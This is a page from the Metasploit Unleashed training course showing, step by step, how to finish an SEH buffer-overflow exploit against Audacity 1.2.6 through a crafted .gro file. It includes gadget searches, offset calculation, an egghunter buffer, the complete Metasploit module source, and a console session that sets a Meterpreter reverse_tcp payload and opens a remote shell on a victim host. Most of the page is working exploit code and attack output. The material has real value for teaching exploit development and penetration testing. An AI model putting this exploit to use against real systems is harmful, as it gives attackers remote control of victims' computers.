<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Completing The Exploit</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Completing
The Exploit</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">This is a standard SEH overflow. We can
notice some of our user
input a "pop, pop, ret" away from us on the stack. An interesting thing
to notice from the screenshot above is the fact that we sent a 2000
byte payload - however it seems that when we return to our buffer, it
gets truncated. We have around 80 bytes of space for our shellcode
(marked in blue). We use the Immunity&nbsp;!safeseh function to locate
unprotected dll's from which a return address can be found.
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Aud-seh-02.png"
 class="image"><img alt="Aud-seh-02.png"
 src="http://www.offensive-security.com/w/images/a/a2/Aud-seh-02.png"
 width="441" height="283"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
We copy over the DLL and search for a POP POP RET instruction
combination using msfpescan.
<br>
<br>
</p>
<pre id="code">root@bt4:/pentest/exploits/framework3# ./msfpescan -p libfftw3f-3.dll<br><br>[libfftw3f-3.dll]<br>0x637410a9 pop esi; pop ebp; retn 0x000c<br>0x63741383 pop edi; pop ebp; ret<br>0x6374144c pop edi; pop ebp; ret<br>0x637414d3 pop edi; pop ebp; ret<br><br>0x637f597b pop edi; pop ebp; ret<br>0x637f5bb6 pop edi; pop ebp; ret<br><br>root@bt4:/pentest/exploits/framework3#</pre>
<br style="color: rgb(0, 0, 0);">
<h4 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
 id="PoC_to_Exploit">PoC to Exploit</span></h4>
<p style="color: rgb(0, 0, 0);">As we used the pattern_create function
to create our initial buffer,
we can now calculate the buffer lenth required to overwrite our
exception handler.
<br>
<br>
</p>
<pre id="code">root@bt4:/pentest/exploits/framework3/tools# ./pattern_offset.rb 67413966<br>178<br>root@bt4:/pentest/exploits/framework3/tools#</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We modify our exploit accordingly by
introducing a valid return address.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">[ 'Audacity Universal 1.2 ', { 'Ret' =&gt; 0x637410A9} ],</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We then adjust the buffer to
redirect the execution flow at the
time of the crash to our return address, jump over it (xEB is a "short
jump") and then land in the breakpoint buffer (xCC).
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code"> def exploit<br>    buff = "\x41" * 174<br>    buff &lt;&lt; "\xeb\x06\x41\x41"<br>    buff &lt;&lt; [target.ret].pack('V')<br>    buff &lt;&lt; "\xCC" * 2000<br>    print_status("Creating '#{datastore['FILENAME']}' file ...")<br>    file_create(buff)<br> end</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Once again, we generate our exploit
file, attach Audacity to the
debugger and import the malicious file. This time, the SEH should be
overwritten with our address - the one that will lead us to a pop, pop,
ret instruction set. We set a breakpoint there, and once again, take
the exception with shift + F9 and walk through our pop pop ret with F8.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Aud-seh-04.png"
 class="image"><img alt="Aud-seh-04.png"
 src="http://www.offensive-security.com/w/images/c/c3/Aud-seh-04.png"
 width="291" height="173"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
The short jump takes us over our return address, into our "shellcode
buffer".
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Aud-seh-10.png"
 class="image"><img alt="Aud-seh-10.png"
 src="http://www.offensive-security.com/w/images/8/8b/Aud-seh-10.png"
 width="576" height="481"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Once again, we have very little buffer space for our payload.A
quick inspection of the memory reveals that our full buffer length can
be found in the heap. Knowing this, we could utilise our initial 80
byte space to execute an egghunter, which would look for and find the
secondary payload.
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Aud-seh-06.png"
 class="image"><img alt="Aud-seh-06.png"
 src="http://www.offensive-security.com/w/images/b/bc/Aud-seh-06.png"
 width="484" height="449"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Implementing the MSF egghunter is relatively easy:
<br>
<br>
</p>
<pre id="code"> def exploit<br>    hunter  = generate_egghunter<br>    egg  = hunter[1]<br> <br>    buff = "\x41" * 174<br>    buff &lt;&lt; "\xeb\x06\x41\x41"<br>    buff &lt;&lt; [target.ret].pack('V')<br>    buff &lt;&lt; "\x90"*4<br>    buff &lt;&lt; hunter[0]<br>    buff &lt;&lt; "\xCC" * 200<br>    buff &lt;&lt; egg + egg<br>    buff &lt;&lt; payload.encoded<br> <br>    print_status("Creating '#{datastore['FILENAME']}' file ...")<br>    file_create(buff)<br> end</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">The final exploit looks like this:
</span>
<pre id="code">##<br># $Id: audacity1-26.rb 6668 2009-06-17 20:54:52Z hdm $<br>##<br><br>##<br># This file is part of the Metasploit Framework and may be subject to <br># redistribution and commercial restrictions. Please see the Metasploit<br># Framework web site for more information on licensing and terms of use.<br># http://metasploit.com/projects/Framework/<br>##<br><br>require 'msf/core'<br><br>class Metasploit3 &lt; Msf::Exploit::Remote<br><br>	include Msf::Exploit::FILEFORMAT<br>	include Msf::Exploit::Remote::Egghunter<br>	<br>	def initialize(info = {})<br>		super(update_info(info,<br>			'Name'           =&gt; 'Audacity 1.2.6 (GRO File) SEH Overflow.',<br>			'Description'    =&gt; %q{<br>					Audacity is prone to a buffer-overflow vulnerability because it fails to perform adequate <br>					boundary checks on user-supplied data. This issue occurs in the <br>					'String_parse::get_nonspace_quoted()' function of the 'lib-src/allegro/strparse.cpp' <br>					source file when handling malformed '.gro' files<br>					This module exploits a stack-based buffer overflow in the Audacity audio editor 1.6.2.<br>					An attacker must send the file to victim and the victim must import the "midi" file.<br>					},<br>			'License'        =&gt; MSF_LICENSE,<br>			'Author'         =&gt; [ 'muts &amp; mr_me', 'Mati &amp; Steve' ],<br>			'Version'        =&gt; '$Revision: 6668 $',<br>			'References'     =&gt;<br>				[<br>					[ 'URL', 'http://milw0rm.com/exploits/7634' ],<br>					[ 'CVE', '2009-0490' ],<br>				],<br>			'Payload'        =&gt;<br>				{<br>					'Space'    =&gt; 2000,<br>					'EncoderType'   =&gt; Msf::Encoder::Type::AlphanumMixed,<br>					'StackAdjustment' =&gt; -3500,<br>				},<br>			'Platform' =&gt; 'win',<br>			'Targets'        =&gt; <br>				[<br>					[ 'Audacity Universal 1.2 ', { 'Ret' =&gt; 0x637410A9} ],<br>				], <br>			'Privileged'     =&gt; false,<br>			'DisclosureDate' =&gt; '5th Jan 2009',<br>			'DefaultTarget'  =&gt; 0))<br><br>			register_options(<br>				[<br>					OptString.new('FILENAME', [ true, 'The file name.',  'auda_eviL.gro']),<br>				], self.class)<br><br>	end<br><br>	def exploit<br>		hunter  = generate_egghunter<br>		egg  = hunter[1]<br>		buff = "\x41" * 174<br>                buff &lt;&lt; "\xeb\x08\x41\x41"<br>                buff &lt;&lt; [target.ret].pack('V')<br>	        buff &lt;&lt; "\x90" * 4<br>                buff &lt;&lt; hunter[0]<br>		buff &lt;&lt; "\x43" * 200<br>                buff &lt;&lt; egg + egg<br>		buff &lt;&lt; payload.encoded<br>		<br>		print_status("Creating '#{datastore['FILENAME']}' file ...")<br><br>		file_create(buff)<br><br>	end<br><br>end</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We run the final exploit through a
debugger to make sure everything
is in order. We can see the egghunter was implemented correctly and is
working perfectly.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Aud-seh-11.png"
 class="image"><img alt="Aud-seh-11.png"
 src="http://www.offensive-security.com/w/images/c/cc/Aud-seh-11.png"
 width="637" height="479"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
We generate out final weaponised exploit:
<br>
<br>
</p>
<pre id="code"> msf &gt; search audacity<br> [*] Searching loaded modules for pattern 'audacity'...<br> <br> Exploits<br> ========<br> <br> Name                         Description<br> ----                         -----------<br> windows/fileformat/audacity  Audacity 1.2.6 (GRO File) SEH Overflow.<br> <br> msf &gt; use windows/fileformat/audacity<br> msf exploit(audacity) &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br> PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br> msf exploit(audacity) &gt; show options<br> <br> Module options:<br> <br> Name        Current Setting                             Required  Description<br> ----        ---------------                             --------  -----------<br> FILENAME    auda_eviL.gro                               yes       The file name.<br> OUTPUTPATH  /pentest/exploits/framework3/data/exploits  yes       The location of the file.<br> <br> <br> Payload options (windows/meterpreter/reverse_tcp):<br> <br> Name      Current Setting  Required  Description<br> ----      ---------------  --------  -----------<br> EXITFUNC  thread           yes       Exit technique: seh, thread, process<br> LHOST     192.168.2.15     yes       The local address<br> LPORT     4444             yes       The local port<br> <br> <br> Exploit target:<br> <br> Id  Name<br> --  ----<br> 0   Audacity Universal 1.2<br> <br> <br> msf exploit(audacity) &gt; exploit<br> <br> [*] Handler binding to LHOST 0.0.0.0<br> [*] Started reverse handler<br> [*] Creating 'auda_eviL.gro' file ...<br> [*] Generated output file /pentest/exploits/framework3/data/exploits/auda_eviL.gro<br> [*] Exploit completed, but no session was created.</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);"> And get a meterpreter shell!
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf exploit(audacity) &gt; use multi/handler<br>msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>msf exploit(handler) &gt; set LHOST 192.168.2.15<br>LHOST =&gt; 192.168.2.15<br>msf exploit(handler) &gt; exploit<br><br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Starting the payload handler...<br>[*] Sending stage (718336 bytes)<br>[*] Meterpreter session 1 opened (192.168.2.15:4444 -&gt; 192.168.2.109:1445)<br><br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Here is a video of Immunity going
through the functioning exploit:
</span>
<p style="color: rgb(0, 0, 0);"><a
 href="http://www.youtube.com/watch?v=LfgAXfAWQXM" class="external free"
 rel="nofollow">http://www.youtube.com/watch?v=LfgAXfAWQXM</a> <br>
<br>
</p>
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Using_The_Egghunter_Mixin"
 title="Using The Egghunter Mixin">Using the Egghunter Mixin</a></div>
</body>
</html>
